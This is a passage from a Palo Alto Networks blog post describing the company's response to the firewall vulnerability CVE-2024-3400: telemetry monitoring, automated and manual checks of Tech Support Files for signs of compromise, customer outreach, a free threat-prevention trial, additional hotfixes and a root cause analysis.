### **Helping Customers Stay Protected**

Palo Alto is closely monitoring the uptake of fixes and mitigations and reaching out to customers who have yet to address the issue.

Since the fix was released, Palo Alto Networks improvised its telemetry collection to help capture additional necessary logs, while monitoring new telemetry data to identify any unknown threat vector. This process helps us stay one step ahead of the threat actor.

As new information surfaces, we constantly update our [security advisory](https://security.paloaltonetworks.com/CVE-2024-3400) and [Unit 42 Threat Brief](https://unit42.paloaltonetworks.com/cve-2024-3400/) to share new IoCs – IPs that customers can use to detect and block threat activity.

### **Helping with the Diagnosis**

To facilitate the investigation of potential compromises, our support system that monitors Tech Support Files (TSF) was quickly reengineered to detect and report traces of evidence of threat activity automatically. TSFs meant for system diagnosis and troubleshooting allow customers to export logs and diagnostic data from a firewall. TSFs provide clues to either an attempted or a successful exploitation of the vulnerability.

TSF automated analysis included searching for log entries, such as those in our security advisory, which indicated potential attempted exploitation of the Stage 1 issue. TSF analysis results now indicate the level of probing or compromise seen in the analysis.

In the event that such entries were identified, TSFs were manually searched for indicators of compromise (IOC). This included successful exploitation of both stage 1 and/or stage 2. For the TSFs that had confirmed IOCs, Unit 42 and Customer Support were involved immediately for proactive outreach.

As a general practice, customers upload a TSF when they open a case with Customer Support. Palo Alto Networks proactively looked at all the TSFs submitted for unrelated cases by the customers in the past 6 months to identify any customer impact. If a customer was found to be impacted, Unit 42 proactively notified the customer.

[The Security advisory for CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400) provides checks that can be run on the device to look for evidence of attempted exploit activity. Please refer to [Unit 42 Threat Brief](https://unit42.paloaltonetworks.com/cve-2024-3400/) for understanding the observed threat activity.

### **Helping with the Mitigations**

Palo Alto Networks is also offering a free trial of Advanced Threat Prevention to customers who do not already have a subscription, to mitigate the issue until a fix is applied. We have also offered Unit 42 incident response services to potentially impacted customers to help them investigate this vulnerability.

### A Choice of **Multiple Upgrade Paths**

Additional hotfixes are available for other commonly deployed maintenance releases to provide the most seamless upgrade path for customers. These are for customers who do not want to upgrade to a fixed version but are looking for an incremental spot fix to address the vulnerability.

### **Preventing Such Issues**

Per our standard product security assurance process, we are performing a Root Cause Analysis to further identify these issues, ensure that they are identified and addressed during development, and continue to enhance product design, including resistance to such attacks.

---

## Related Blogs

### [Announcement](/blog/category/announcement/), [Cloud Native Application Platform](/blog/prisma-cloud/category/cloud-native-application-platform/), [Cloud Security](/blog/prisma-cloud/category/cloud-security/), [Company & Culture](/blog/category/company-culture/), [Points of View](/blog/category/points-of-view/), [Products and Services](/blog/category/products-and-services/)

[#### Prisma Cloud Is a CNAPP Leader According to Frost & Sullivan](https://www.paloaltonetworks.com/blog/2022/11/prisma-cloud-is-a-cnapp-leader/)

### [Announcement](/blog/category/announcement/), [Company & Culture](/blog/category/company-culture/), [Products and Services](/blog/category/products-and-services/)

[#### Accelerate Your Cybersecurity Transformation at Ignite On Tour](https://www.paloaltonetworks.com/blog/2024/03/cybersecurity-transformation-at-ignite-on-tour/)

### [Announcement](/blog/category/announcement/), [Products and Services](/blog/category/products-and-services/)

[#### Today’s Attack Trends — Unit 42 Incident Response Report](https://www.paloaltonetworks.com/blog/2024/02/unit-42-incident-response-report/)

### [Announcement](/blog/category/announcement/), [News & Events](/blog/sase/category/news-events/), [Points of View](/blog/category/points-of-view/), [Products and Services](/blog/category/products-and-services/), [SD-WAN](/blog/sase/category/sd-wan/)

[#### Palo Alto Networks a Leader in the Gartner® Magic Quadrant™ for SD-WAN](https://www.paloaltonetworks.com/blog/2023/10/leader-in-the-gartner-magic-quadrant-for-sd-wan/)

### [Announcement](/blog/category/announcement/), [Company & Culture](/blog/category/company-culture/), [News & Events](/blog/sase/category/news-events/), [Product Features](/blog/sase/category/product-features/), [Products and Services](/blog/category/products-and-services/)

[#### The Only Leader in Single-Vendor SASE. Period.](https://www.paloaltonetworks.com/blog/2023/08/leader-in-single-vendor-sase/)

### [Announcement](/blog/category/announcement/), [Company & Culture](/blog/category/company-culture/), [Education](/blog/category/education/), [Points of View](/blog/category/points-of-view/)

[#### Investing in a Robust Cybersecurity Workforce](https://www.paloaltonetworks.com/blog/2023/08/investing-in-a-robust-cybersecurity-workforce/)

### Subscribe to the Blog!

Sign up to receive must-read articles, Playbooks of the Week, new feature announcements, and more.

![spinner](https://www.paloaltonetworks.com/blog/wp-content/themes/panwblog2023/dist/images/ajax-loader.gif)
Sign up

Please enter a valid email.

By submitting this form, you agree to our [Terms of Use](/legal-notices/terms-of-use) and acknowledge our [Privacy Statement](/legal-notices/privacy). Please look for a confirmation email from us. If you don't receive it in the next 10 minutes, please check your spam folder.

## Get the latest news, invites to events, and threat alerts

Enter your email now to subscribe!

Sign up

By submitting this form, you agree to our
[Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)
and acknowledge our
[Privacy Statement](https://www.paloaltonetworks.com/legal-notices/privacy).

Sign up

## Products and Services

* [Network Security Platform](/network-security)
* [CLOUD DELIVERED SECURITY SERVICES](/network-security/security-subscriptions)
* [Advanced Threat Prevention](/network-security/advanced-threat-prevention)
* [DNS Security](/network-security/advanced-dns-security)
* [Data Loss Prevention](/network-security/enterprise-data-loss-prevention)
* [IoT Security](/network-security/enterprise-iot-security)
* [Next-Generation Firewalls](/network-security/next-generation-firewall)
* [Hardware Firewalls](/network-security/next-generation-firewall-hardware)
* [Strata Cloud Manager](/network-security/strata-cloud-manager)
* [SECURE ACCESS SERVICE EDGE](/sase)
* [Prisma Access](/sase/access)
* [Prisma SD-WAN](/sase/sd-wan)
* [Autonomous Digital Experience Management](/sase/adem)
* [Cloud Access Security Broker](/sase/next-gen-casb)
* [Zero Trust Network Access](/sase/ztna)

* [Code to Cloud Platform](/prisma/whyprisma)
* [Prisma Cloud](/prisma/cloud)
* [Cloud-Native Application Protection Platform](/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform)

* [AI-Driven Security Operations Platform](/cortex)
* [Cortex XDR](/cortex/cortex-xdr)
* [Cortex XSOAR](/cortex/cortex-xsoar)
* [Cortex Xpanse](/cortex/cortex-xpanse)
* [Cortex XSIAM](/cortex/cortex-xsiam)
* [External Attack Surface Protection](/cortex/cortex-xpanse/attack-surface-management)
* [Security Automation](/cortex/security-operations-automation)
* [Threat Prevention, Detection & Response](/cortex/detection-and-response)

* [Threat Intel and Incident Response Services](/unit42)
* [Proactive Assessments](/unit42/assess)
* [Incident Response](/unit42/respond)
* [Transform Your Security Strategy](/unit42/transform)
* [Discover Threat Intelligence](/unit42/threat-intelligence-partners)
## Company

* [About Us](/about-us)
* [Careers](https://jobs.paloaltonetworks.com/en/)
* [Contact Us](/company/contact-sales)
* [Corporate Responsiblity](/about-us/corporate-responsibility)
* [Customers](/customers)
* [Investor Relations](https://investors.paloaltonetworks.com/)
* [Location](/about-us/locations)
* [Newsroom](/company/newsroom)
## Popular Links

* [Blog](https://www.paloaltonetworks.com/blog/)
* [Communities](/communities)
* [Content Library](/resources)
* [Cyberpedia](/cyberpedia)
* [Event Center](https://events.paloaltonetworks.com/)
* [Manage Email Preferences](https://start.paloaltonetworks.com/preference-center)
* [Products A-Z](/products/products-a-z)
* [Product Certifications](/legal-notices/trust-center/tech-certs)
* [Report a Vulnerability](/security-disclosure)
* [Sitemap](/sitemap)
* [Tech Docs](https://docs.paloaltonetworks.com/)
* [Unit 42](https://unit42.paloaltonetworks.com)
* [Do Not Sell or Share My Personal Information](https://panwedd.exterro.net/portal/dsar.htm?target=panwedd)

![Paloaltonetworks logo](/etc/clientlibs/clean/imgs/pan-logo-dark.svg)

* [Privacy](/legal-notices/privacy)
* [Trust Center](/legal-notices/trust-center)
* [Terms of Use](/legal-notices/terms-of-use)
* [Documents](/legal)

Copyright © 2025 Palo Alto Networks. All Rights Reserved

* [![](/etc/clientlibs/clean/imgs/social/youtube-black.svg)](https://www.youtube.com/user/paloaltonetworks)
* [![](/etc/clientlibs/clean/imgs/social/twitter-x-black.svg)](https://twitter.com/PaloAltoNtwks)
* [![](/etc/clientlibs/clean/imgs/social/facebook-black.svg)](https://www.facebook.com/PaloAltoNetworks/)
* [![](/etc/clientlibs/clean/imgs/social/linkedin-black.svg)](https://www.linkedin.com/company/palo-alto-networks)
* [![Podcast](/content/dam/pan/en_US/images/icons/podcast.svg)](https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/)
* EN
  Select your language


